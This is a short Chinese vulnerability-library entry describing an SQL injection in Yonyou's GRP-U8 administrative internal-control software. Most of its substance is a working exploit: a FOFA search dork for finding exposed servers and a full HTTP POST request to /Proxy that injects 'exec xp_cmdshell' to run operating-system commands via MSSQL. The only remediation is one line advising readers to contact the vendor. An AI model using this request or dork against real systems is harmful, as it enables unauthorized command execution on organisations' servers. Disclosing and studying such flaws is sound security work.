---
title: '用友GRP-U8行政事业内控管理软件SQL注入漏洞'
date: Mon, 21 Sep 2020 01:22:43 +0000
draft: false
tags: ['白阁-漏洞库']
---

#### 漏洞信息:

用友公司成立于1988年，全面提供具有自主知识产权的企业管理/ERP软件、服务与解决方案，是中国最大的管理软件、ERP软件、集团管理软件、人力资源管理软件、客户关系管理软件及小型企业管理软件提供商。其GRP-U8行政事业内控管理软件特定版本存在SQL注入漏洞，可用于命令执行执行。

#### 漏洞复现:

fofa\_dork: “用友GRP-u8”

##### POC:

```
POST /Proxy HTTP/1.1
Accept: Accept: */*
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;)
Host: host
Content-Length: 357
Connection: Keep-Alive
Cache-Control: no-cache

cVer=9.8.0&dp=<?xml version="1.0" encoding="GB2312"?><R9PACKET version="1"><DATAFORMAT>XML</DATAFORMAT><R9FUNCTION><NAME>AS_DataRequest</NAME><PARAMS><PARAM><NAME>ProviderName</NAME><DATA format="text">DataSetProviderData</DATA></PARAM><PARAM><NAME>Data</NAME><DATA format="text">exec xp_cmdshell 'net user'</DATA></PARAM></PARAMS></R9FUNCTION></R9PACKET> 
```输出md5值，用于poc验证： ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/微信图片_20200921092131.jpg) 使用MSSQL xp\_cmdshell执行命令 ![](https://www.bylibrary.cn/wp-content/uploads/2020/09/微信图片_20200921092204.jpg)

#### 修复方案:

联系用友官方获得安全升级方案